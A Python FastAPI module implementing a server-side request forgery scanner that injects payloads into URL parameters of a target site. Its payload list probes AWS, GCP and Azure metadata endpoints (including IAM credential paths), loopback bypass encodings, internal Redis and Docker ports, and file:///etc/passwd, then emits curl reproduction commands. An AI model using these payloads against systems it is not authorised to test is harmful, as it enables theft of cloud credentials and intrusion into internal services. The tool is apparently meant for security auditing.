"""
SSRF Scanner — Server-Side Request Forgery vulnerability auditor.
Tests cloud metadata endpoints, internal loopback IP bypasses, protocol schemes, and internal service ports.
Inspired by Strix autonomous penetration testing methodologies.
"""
from __future__ import annotations
import asyncio
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Any, Optional
import httpx
from fastapi import APIRouter
from pydantic import BaseModel
from tools.utils import clean_url, f, ok, err, HEADERS

router = APIRouter(tags=["scanning"])

COMMON_SSRF_PARAMS = [
    "url", "dest", "destination", "target", "redirect", "uri", "path",
    "feed", "proxy", "webhook", "domain", "load", "fetch", "src", "link",
    "api", "endpoint", "host", "preview", "download", "import", "service"
]

SSRF_PAYLOADS = [
    # AWS Metadata
    {
        "name": "AWS EC2 Metadata (IMDSv1)",
        "vector": "http://169.254.169.254/latest/meta-data/",
        "sig": [r"ami-id", r"instance-id", r"local-ipv4", r"security-credentials"],
        "category": "Cloud Metadata",
        "sev": "critical"
    },
    {
        "name": "AWS Security Credentials",
        "vector": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "sig": [r"role-name", r"Code", r"Type", r"AccessKeyId"],
        "category": "Cloud Metadata",
        "sev": "critical"
    },
    # GCP Metadata
    {
        "name": "GCP Compute Engine Metadata",
        "vector": "http://metadata.google.internal/computeMetadata/v1/",
        "sig": [r"computeMetadata", r"instance", r"project"],
        "category": "Cloud Metadata",
        "sev": "critical"
    },
    # Azure Metadata
    {
        "name": "Azure Instance Metadata",
        "vector": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "sig": [r"compute", r"osType", r"vmId"],
        "category": "Cloud Metadata",
        "sev": "critical"
    },
    # Localhost Standard & Decimal IP Bypasses
    {
        "name": "Loopback 127.0.0.1",
        "vector": "http://127.0.0.1:80/",
        "sig": [],
        "category": "Loopback",
        "sev": "high"
    },
    {
        "name": "Decimal Dword IP Bypass (2130706433)",
        "vector": "http://2130706433/",
        "sig": [],
        "category": "Loopback Bypass",
        "sev": "high"
    },
    {
        "name": "Hexadecimal IP Bypass (0x7f000001)",
        "vector": "http://0x7f000001/",
        "sig": [],
        "category": "Loopback Bypass",
        "sev": "high"
    },
    {
        "name": "IPv6 Loopback [::1]",
        "vector": "http://[::1]:80/",
        "sig": [],
        "category": "Loopback Bypass",
        "sev": "high"
    },
    # Internal Ports & Protocol Schemes
    {
        "name": "Internal Redis Port (6379)",
        "vector": "http://127.0.0.1:6379/",
        "sig": [r"-ERR", r"redis_version", r"redis"],
        "category": "Internal Service",
        "sev": "critical"
    },
    {
        "name": "Docker Daemon API (2375)",
        "vector": "http://127.0.0.1:2375/version",
        "sig": [r"ApiVersion", r"Arch", r"Docker"],
        "category": "Internal Service",
        "sev": "critical"
    },
    {
        "name": "Local File Protocol (file:///etc/passwd)",
        "vector": "file:///etc/passwd",
        "sig": [r"root:x:0:0:", r"nobody:", r"/bin/bash"],
        "category": "Protocol Wrapper",
        "sev": "critical"
    },
]


class SsrfRequest(BaseModel):
    target: str
    param: str = ""
    mode: str = "all"  # all | cloud | loopback | bypass


@router.post("/ssrf_scanner")
async def ssrf_scanner(req: SsrfRequest):
    url = clean_url(req.target)
    parsed = urlparse(url)
    existing_qs = parse_qs(parsed.query)

    params_to_test = []
    if req.param and req.param.strip():
        params_to_test = [req.param.strip()]
    elif existing_qs:
        params_to_test = list(existing_qs.keys())
    else:
        # Fuzz standard SSRF parameter candidates
        params_to_test = ["url", "dest", "target", "redirect", "proxy", "webhook", "path", "feed"]

    # Filter payloads by mode
    if req.mode == "cloud":
        active_payloads = [p for p in SSRF_PAYLOADS if p["category"] == "Cloud Metadata"]
    elif req.mode == "loopback":
        active_payloads = [p for p in SSRF_PAYLOADS if "Loopback" in p["category"]]
    elif req.mode == "bypass":
        active_payloads = [p for p in SSRF_PAYLOADS if "Bypass" in p["category"] or p["category"] == "Protocol Wrapper"]
    else:
        active_payloads = SSRF_PAYLOADS

    findings = []
    records = []
    confirmed_vulnerabilities = []
    pocs = []
    semaphore = asyncio.Semaphore(10)

    # Establish baseline request with external canary
    baseline_status = 200
    baseline_len = 0
    try:
        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=8) as c:
            base_r = await c.get(url, headers=HEADERS)
            baseline_status = base_r.status_code
            baseline_len = len(base_r.text)
    except Exception:
        pass

    async def test_ssrf_vector(param_name: str, payload_info: dict):
        async with semaphore:
            test_val = payload_info["vector"]
            # Build query string
            current_params = dict(existing_qs)
            current_params[param_name] = [test_val]
            # Flatten for urlencode
            flat_params = {k: v[0] if isinstance(v, list) else v for k, v in current_params.items()}
            new_query = urlencode(flat_params)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

            try:
                async with httpx.AsyncClient(verify=False, follow_redirects=False, timeout=6) as client:
                    t0 = time.time()
                    resp = await client.get(test_url, headers={**HEADERS, "Metadata-Flavor": "Google"})
                    elapsed = round((time.time() - t0) * 1000)

                    body = resp.text
                    status = resp.status_code
                    content_len = len(body)
                    headers_str = str(resp.headers).lower()

                    is_confirmed = False
                    reason = ""

                    # Check 1: Signatures in response
                    for sig_pat in payload_info["sig"]:
                        if re.search(sig_pat, body, re.I):
                            is_confirmed = True
                            reason = f"Response body leaked signature matching '{sig_pat}'"
                            break

                    # Check 2: Cloud Metadata header disclosure
                    if "x-aws-ec2-metadata-token-status" in headers_str or "metadata-flavor" in headers_str:
                        is_confirmed = True
                        reason = "Server returned cloud metadata headers"

                    # Check 3: Differential status vs baseline
                    status_anomaly = False
                    if status == 200 and baseline_status in (400, 404, 500):
                        status_anomaly = True
                    elif status == 500 and "connection refused" in body.lower():
                        status_anomaly = True

                    curl_cmd = f'curl -s -k "{test_url}"'

                    if is_confirmed:
                        confirmed_vulnerabilities.append({
                            "param": param_name,
                            "vector": payload_info["name"],
                            "target": test_url
                        })
                        findings.append(f(
                            payload_info["sev"],
                            f"SSRF Detected: {payload_info['name']} (Param: {param_name})",
                            f"Payload: {test_val} injected into parameter '{param_name}'. {reason}. HTTP {status} ({content_len}B).",
                            "Implement strict URL/IP whitelisting, disable fetching internal ranges (RFC 1918 / 169.254.169.254), enforce IMDSv2 token hop limits."
                        ))
                        pocs.append(f"# Reproduction for {payload_info['name']}:\n{curl_cmd}")

                    records.append({
                        "Parameter": param_name,
                        "Vector Name": payload_info["name"],
                        "Injected Payload": test_val[:35] + ("..." if len(test_val) > 35 else ""),
                        "HTTP Status": status,
                        "Latency": f"{elapsed}ms",
                        "Result": "💀 VULNERABLE" if is_confirmed else ("⚠ Anomaly" if status_anomaly else "Filtered / Safe")
                    })

            except httpx.TimeoutException:
                records.append({
                    "Parameter": param_name,
                    "Vector Name": payload_info["name"],
                    "Injected Payload": test_val[:35],
                    "HTTP Status": "Timeout",
                    "Latency": ">6000ms",
                    "Result": "Timed out (Internal Filter / Drop)"
                })
            except Exception as e:
                records.append({
                    "Parameter": param_name,
                    "Vector Name": payload_info["name"],
                    "Injected Payload": test_val[:35],
                    "HTTP Status": 0,
                    "Latency": "0ms",
                    "Result": f"Conn Error ({str(e)[:25]})"
                })

    tasks = []
    for param in params_to_test:
        for payload in active_payloads:
            tasks.append(test_ssrf_vector(param, payload))

    await asyncio.gather(*tasks)

    if not confirmed_vulnerabilities:
        findings.append(f(
            "pass",
            "No Direct SSRF Response Disclosed",
            f"Tested {len(records)} SSRF injection combinations across parameters {params_to_test}."
        ))

    summary = {
        "Target URL": url,
        "Parameters Tested": ", ".join(params_to_test),
        "Vectors Evaluated": len(records),
        "SSRF Vulnerabilities Found": len(confirmed_vulnerabilities),
        "Cloud Metadata Exposed": "CRITICAL YES" if any("Cloud" in v["vector"] for v in confirmed_vulnerabilities) else "No",
    }

    result = {
        "summary": summary,
        "findings": findings,
        "records": records,
        "record_columns": ["Parameter", "Vector Name", "Injected Payload", "HTTP Status", "Latency", "Result"],
    }
    if pocs:
        result["raw"] = "\n\n".join(pocs)

    return ok(result)
